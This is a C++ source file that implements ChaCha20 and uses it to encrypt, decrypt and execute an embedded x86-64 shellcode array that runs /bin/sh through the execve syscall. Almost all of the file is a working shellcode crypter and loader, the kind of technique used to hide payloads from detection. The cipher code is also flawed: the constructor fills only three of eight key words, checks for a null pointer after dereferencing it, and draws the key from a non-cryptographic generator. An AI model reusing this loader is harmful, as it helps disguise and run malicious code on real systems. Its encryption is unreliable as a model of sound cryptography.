#include <iostream>
#include <cstring>
#include <cstdint>
#include <random>
#include <iomanip>

#define ROTL(x, n) (((x) << (n)) | ((x) >> (32 - (n))))

class ChaCha20 { // ChaCha20 implementation <- no Poly1305 ... for now
private:
  const uint32_t u32Constant[4] = {
    0x61707865, 
    0x3320646e, 
    0x79622d32,
    0x6b206574
  };

  uint32_t u32State[16]         = { 0 };
  uint32_t u32WorkingState[16]  = { 0 };
  uint8_t u8SerializedState[64] = { 0 };

  uint32_t u32Key[8]        = { 0 };
  uint32_t u32Nonce[3]      = { 0 };
  uint32_t u32BlockCounter  = 0;

  uint32_t RotL(uint32_t num, uint32_t offset) {
    return (((num) << (offset)) | ((num) >> (32 - (offset))));
  }

  void QRound(int a, int b, int c, int d) {
    u32WorkingState[a] += u32WorkingState[b];
    u32WorkingState[d] ^= u32WorkingState[a];
    u32WorkingState[d] = RotL(u32WorkingState[d], 16);

    u32WorkingState[c] += u32WorkingState[d];
    u32WorkingState[b] ^= u32WorkingState[c];
    u32WorkingState[b] = RotL(u32WorkingState[b], 12);

    u32WorkingState[a] += u32WorkingState[b];
    u32WorkingState[d] ^= u32WorkingState[a];
    u32WorkingState[d] = RotL(u32WorkingState[d], 8);

    u32WorkingState[c] += u32WorkingState[d];
    u32WorkingState[b] ^= u32WorkingState[c];
    u32WorkingState[b] = RotL(u32WorkingState[b], 7);
  }

  void InnerBlock() {
    // Column rounds
    QRound(0, 4, 8, 12);
    QRound(1, 5, 9, 13);
    QRound(2, 6, 10, 14);
    QRound(3, 7, 11, 15);

    // Diagonal rounds
    QRound(0, 5, 10, 15);
    QRound(1, 6, 11, 12);
    QRound(2, 7, 8, 13);
    QRound(3, 4, 9, 14);
  }

  void Block() {
    /*
    CCCCCCCC CCCCCCCC CCCCCCCC CCCCCCCC
    KKKKKKKK KKKKKKKK KKKKKKKK KKKKKKKK
    KKKKKKKK KKKKKKKK KKKKKKKK KKKKKKKK
    BBBBBBBB NNNNNNNN NNNNNNNN NNNNNNNN

    C = CONSTANT
    K = KEY
    B = BLOCK COUNTER
    N = NONCE
    */
    memcpy(u32State, u32Constant, sizeof(u32Constant));
    memcpy(u32State + 4, u32Key, 32);
    memcpy(u32State + 13, u32Nonce, 12);
    u32State[12] = u32BlockCounter;

    memcpy(u32WorkingState, u32State, sizeof(u32State));

    for (int i = 0; i < 10; ++i) {
      InnerBlock();
    }

    for (int i = 0; i< 16; ++i) {
      u32WorkingState[i] += u32State[i];
    }
  }

  void SerializeState() {
    for (int i = 0; i < 16; ++i) {
      u8SerializedState[i * 4 + 0] = static_cast<uint8_t>(u32WorkingState[i] & 0xFF);
      u8SerializedState[i * 4 + 1] = static_cast<uint8_t>((u32WorkingState[i] >> 8) & 0xFF);
      u8SerializedState[i * 4 + 2] = static_cast<uint8_t>((u32WorkingState[i] >> 16) & 0xFF);
      u8SerializedState[i * 4 + 3] = static_cast<uint8_t>((u32WorkingState[i] >> 24) & 0xFF);
    }
  }

public:
  // INIT KEY
  ChaCha20(uint32_t* u32Key) {
    if (u32Key[0] == 0 || u32Key[1] == 0 || u32Key[2] == 0 || u32Key == nullptr) {
      std::random_device rd;
      std::mt19937 gen(rd());
      std::uniform_int_distribution<uint32_t> dist(0x10000000, 0xFFFFFFFF);

      this->u32Key[0] = dist(gen);
      this->u32Key[1] = dist(gen);
      this->u32Key[2] = dist(gen);
    } else {
      this->u32Key[0] = u32Key[0];
      this->u32Key[1] = u32Key[1];
      this->u32Key[2] = u32Key[2];
    }
  };
  ~ChaCha20() = default;

  void Encrypt(unsigned char* pbPlaintext, int iPlainLen, bool xDecrypt) {
    if (!xDecrypt) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<uint32_t> dist(0x10000000, 0xFFFFFFFF);

        u32Nonce[0] = 0x53455845; // "EXDS" (in reverse)
        u32Nonce[1] = dist(gen);  // be random
        u32Nonce[2] = dist(gen);  // be random
    }
    u32BlockCounter = 0;

    int k = 0;
    for (int j = 0; j < (iPlainLen / 64); ++j) {
        u32BlockCounter++;
        Block();
        
        SerializeState();
        for (int i = 0; i < 64; i++) {
            pbPlaintext[k] ^= u8SerializedState[i];
            k++;
        }
    }
    
    // Handle remaining bytes
    if ((iPlainLen % 64) != 0) {
        u32BlockCounter++;
        Block();

        SerializeState();
        for (int i = 0; i < (iPlainLen % 64); i++) {
            pbPlaintext[k] ^= u8SerializedState[i];
            k++;
        }
    }
}
};

int main(void) {
  unsigned char plaintext[] = {
    0x48, 0xb8, 0x2f, 0x62, 
    0x69, 0x6e, 0x2f, 0x73, 
    0x68, 0x00, 0x50, 0x54, 
    0x5f, 0x31, 0xc0, 0x50, 
    0xb0, 0x3b, 0x54, 0x5a, 
    0x54, 0x5e, 0x0f, 0x05
  };

  std::cout << "[#] Initializing ChaCha20 Class" << std::endl;
  uint32_t key[3] = { 0x0, 0x0, 0x0 };
  ChaCha20 cc20(key);

  std::cout << "SHELLCODE:" << std::endl;

  std::cout << std::endl;
  for (int j = 0; j < (int)sizeof(plaintext); j++) {
    std::cout << std::setw(2) << std::setfill('0') << std::hex << (int)plaintext[j] << " ";
    if ((j + 1) % 4 == 0 && j != (int)sizeof(plaintext) - 1) { // Print newline after every 4 bytes, except after the last byte
      std::cout << std::endl;
    }
  }
  std::cout << std::endl;
  std::cout << std::endl;

  std::cout << "[#] Encrypting using ChaCha20..." << std::endl;
  cc20.Encrypt(plaintext, sizeof(plaintext), false);

  std::cout << std::endl;
  for (int j = 0; j < (int)sizeof(plaintext); j++) {
    std::cout << std::setw(2) << std::setfill('0') << std::hex << (int)plaintext[j] << " ";
    if ((j + 1) % 4 == 0 && j != (int)sizeof(plaintext) - 1) { // Print newline after every 4 bytes, except after the last byte
      std::cout << std::endl;
    }
  }
  std::cout << std::endl;
  std::cout << std::endl;

  std::cout << "[#] Decrypting using ChaCha20..." << std::endl;
  cc20.Encrypt(plaintext, sizeof(plaintext), true);

  std::cout << std::endl;
  for (int j = 0; j < (int)sizeof(plaintext); j++) {
    std::cout << std::setw(2) << std::setfill('0') << std::hex << (int)plaintext[j] << " ";
    if ((j + 1) % 4 == 0 && j != (int)sizeof(plaintext) - 1) { // Print newline after every 4 bytes, except after the last byte
      std::cout << std::endl;
    }
  }
  std::cout << std::endl;
  std::cout << std::endl;

  std::cout << "[#] Attempting to spawn shell using decrypted shellcode" << std::endl;
  int (*ret)() = (int(*)())plaintext;
  ret();

  return 0;
}
